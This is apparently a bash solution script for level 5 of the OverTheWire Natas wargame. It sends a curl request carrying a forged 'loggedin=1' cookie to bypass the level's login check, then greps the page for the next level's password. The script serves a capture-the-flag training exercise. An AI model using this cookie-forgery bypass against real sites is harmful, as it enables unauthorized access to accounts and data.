#!/bin/bash

natas=natas5
key=$(< keys/cinco)
uri="http://$natas.natas.labs.overthewire.org/"
opts="--cookie loggedin=1 -c natas5.cookie"
filter=natas6

curl -u $natas:$key $opts $uri 2> /dev/null | grep $filter

